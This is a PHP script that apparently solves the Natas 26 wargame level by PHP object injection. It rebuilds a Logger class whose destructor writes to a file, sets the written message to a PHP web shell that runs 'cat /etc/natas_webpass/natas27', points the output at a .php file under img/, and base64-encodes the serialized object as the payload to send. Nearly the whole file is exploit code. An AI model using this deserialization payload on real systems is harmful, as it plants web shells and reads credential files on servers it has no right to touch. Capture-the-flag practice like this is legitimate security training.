<!DOCTYPE html>
<html>
<body>

<?php
class Logger{
  private $logFile;
  private $initMsg;
  private $exitMsg;

  function __construct($file){
    // initialise variables
    $this->initMsg="#--session started--#\n";
    $this->exitMsg="#--session end--#\n";
    $this->logFile = "/tmp/natas_" . $file . ".log";

    echo "Constructor called!\n" . $this->logFile . "\n\n";

    // write initial message
    $fd=fopen($this->logFile,"a+");
    fwrite($fd,$this->initMsg);
    fclose($fd);
  }                       

  function log(){
    echo $this->logFile;
  }                       

  function setLogFile($logFile) {
    $this->logFile = $logFile;
  }

  function setExitMsg($exitMsg) {
    $this->exitMsg = $exitMsg;
  }

  function __destruct(){
    echo "Destructor called!\n";

    // write exit message
    $fd=fopen($this->logFile,"a+");
    fwrite($fd,$this->exitMsg);
    fclose($fd);
  }                       
}

$arr = array();
$arr[] = new Logger("bbb");
$arr[0]->setExitMsg("<?php echo shell_exec(\"cat /etc/natas_webpass/natas27\"); ?>");
$arr[0]->setLogFile("img/natas26_ehbjp37k7oqbkbsfpqp7h7p1r5.php");


//$data_s = serialize($arr);
//echo base64_decode("YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyNjoiL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjciO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czoyMjoiIy0tc2Vzc2lvbiBzdGFydGVkLS0jCiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjE4OiIjLS1zZXNzaW9uIGVuZC0tIwoiO319") . "\n\n";

//echo base64_encode($data_s);
$data_bsf = "YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo0MjoiaW1nL25hdGFzMjZfZWhianAzN2s3b3Fia2JzZnBxcDdoN3AxcjUucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MjI6IiMtLXNlc3Npb24gc3RhcnRlZC0tIwoiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1OToiPD9waHAgZWNobyBzaGVsbF9leGVjKCJjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjciKTsgPz4iO319";

$data = unserialize(base64_decode($data_bsf));
//$object->log();

foreach($data as $object) {
}

$object->log();
//echo "Test!";
?>

</body>
</html>